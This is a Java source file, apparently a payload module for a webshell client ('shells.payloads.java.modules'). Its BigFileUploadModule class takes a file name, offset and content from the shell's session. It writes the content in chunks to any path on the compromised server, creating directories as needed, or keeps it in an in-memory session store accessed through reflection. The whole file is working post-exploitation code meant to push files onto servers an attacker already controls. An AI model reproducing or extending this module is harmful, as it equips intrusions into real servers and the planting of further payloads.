package shells.payloads.java.modules;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.util.Map;

public class BigFileUploadModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[]) value);
        }
        return value != null ? value.toString() : null;
    }

    private byte[] getBytes(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        return value instanceof byte[] ? (byte[]) value : null;
    }

    private Map getSessionTable() {
        if (this.session == null) {
            return null;
        }
        Object value = this.session.get("sessionTable");
        return value instanceof Map ? (Map) value : null;
    }

    private static byte[] getBaosBuf(ByteArrayOutputStream baos) throws Exception {
        Field f = ByteArrayOutputStream.class.getDeclaredField("buf");
        f.setAccessible(true);
        return (byte[]) f.get(baos);
    }

    private static int getBaosCount(ByteArrayOutputStream baos) throws Exception {
        Field f = ByteArrayOutputStream.class.getDeclaredField("count");
        f.setAccessible(true);
        return ((Integer) f.get(baos)).intValue();
    }

    private static void setBaosBuf(ByteArrayOutputStream baos, byte[] buf) throws Exception {
        Field f = ByteArrayOutputStream.class.getDeclaredField("buf");
        f.setAccessible(true);
        f.set(baos, buf);
    }

    private static void setBaosCount(ByteArrayOutputStream baos, int count) throws Exception {
        Field f = ByteArrayOutputStream.class.getDeclaredField("count");
        f.setAccessible(true);
        f.set(baos, Integer.valueOf(count));
    }
    
    public void setSession(Map session) {
        this.session = session;
    }
    
    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
    
    public byte[] execute() {
        try {
            String fileName = getString("fileName");
            String positionString = getString("position");
            byte[] content = getBytes("fileContents");
            
            if (fileName != null && positionString != null && content != null) {
                long position = Long.parseLong(positionString);
                if (fileName.startsWith("mem://")) {
                    Map sessionTable = this.getSessionTable();
                    if (sessionTable == null) {
                        sessionTable = this.session;
                    }

                    String memKey = fileName;
                    String legacyMemKey = "MEMFS:" + fileName;
                    int positionInt = (int) position;
                    if ((long) positionInt != position) {
                        return "Error: position too large".getBytes();
                    }

                    int requiredSize = positionInt + content.length;
                    if (requiredSize < 0) {
                        return "Error: size overflow".getBytes();
                    }

                    Object oldValue = sessionTable.get(memKey);
                    if (!(oldValue instanceof ByteArrayOutputStream) && !(oldValue instanceof byte[])) {
                        oldValue = sessionTable.get(legacyMemKey);
                    }
                    ByteArrayOutputStream baos = oldValue instanceof ByteArrayOutputStream ? (ByteArrayOutputStream) oldValue : null;
                    if (baos == null) {
                        baos = new ByteArrayOutputStream(requiredSize);
                        if (oldValue instanceof byte[] && ((byte[]) oldValue).length > 0) {
                            baos.write((byte[]) oldValue);
                        }
                        sessionTable.put(memKey, baos);
                        sessionTable.put(legacyMemKey, baos);
                    }

                    int oldCount = -1;
                    try {
                        oldCount = getBaosCount(baos);
                    } catch (Exception ignored) {
                    }

                    if (positionInt == baos.size()) {
                        baos.write(content);
                    } else {
                        try {
                            byte[] buf = getBaosBuf(baos);
                            int count = oldCount >= 0 ? oldCount : getBaosCount(baos);
                            int required = requiredSize;
                            if (required > buf.length) {
                                int newCap = buf.length > 0 ? buf.length : 1;
                                while(newCap < required) {
                                    newCap = newCap << 1;
                                    if (newCap <= 0) {
                                        newCap = required;
                                        break;
                                    }
                                }
                                byte[] newBuf = new byte[newCap];
                                if (count > 0) {
                                    System.arraycopy(buf, 0, newBuf, 0, count);
                                }
                                buf = newBuf;
                                setBaosBuf(baos, buf);
                            }
                            System.arraycopy(content, 0, buf, positionInt, content.length);
                            int newCount = required > count ? required : count;
                            setBaosCount(baos, newCount);
                        } catch (Exception e) {
                            byte[] cur = baos.toByteArray();
                            int oldLen = cur.length;
                            int newLen = oldLen > requiredSize ? oldLen : requiredSize;
                            byte[] merged = new byte[newLen];
                            if (oldLen > 0) {
                                System.arraycopy(cur, 0, merged, 0, oldLen);
                            }
                            System.arraycopy(content, 0, merged, positionInt, content.length);
                            baos.reset();
                            baos.write(merged, 0, newLen);
                        }
                    }

                    String sizeKey = memKey + ":size";
                    String legacySizeKey = legacyMemKey + ":size";
                    long newSize = (long) requiredSize;
                    Object sizeValue = sessionTable.get(sizeKey);
                    if (sizeValue == null) {
                        sizeValue = sessionTable.get(legacySizeKey);
                    }
                    if (sizeValue instanceof Number) {
                        long oldSize = ((Number) sizeValue).longValue();
                        if (oldSize > newSize) {
                            newSize = oldSize;
                        }
                    } else if (sizeValue instanceof String) {
                        try {
                            long oldSize = Long.parseLong((String) sizeValue);
                            if (oldSize > newSize) {
                                newSize = oldSize;
                            }
                        } catch (Exception ignored) {
                        }
                    } else if (sizeValue instanceof byte[]) {
                        try {
                            long oldSize = Long.parseLong(new String((byte[]) sizeValue));
                            if (oldSize > newSize) {
                                newSize = oldSize;
                            }
                        } catch (Exception ignored) {
                        }
                    }
                    Long sizeObj = Long.valueOf(newSize);
                    sessionTable.put(sizeKey, sizeObj);
                    sessionTable.put(legacySizeKey, sizeObj);

                    return "ok".getBytes();
                }

                File file = new File(fileName);
                File parentDir = file.getParentFile();
                
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }
                
                // JDK 1.6: no try-with-resources.
                RandomAccessFile raf = null;
                try {
                    raf = new RandomAccessFile(file, "rw");
                    raf.seek(position);
                    raf.write(content);
                } finally {
                    if (raf != null) { try { raf.close(); } catch (Exception ignored) {} }
                }
                
                return "ok".getBytes();
            }
            return "Missing parameters".getBytes();
        } catch (Exception e) {
            return ("Error: " + e.getMessage()).getBytes();
        }
    }
    
    public String getModuleName() {
        return "bigFileUpload";
    }
}
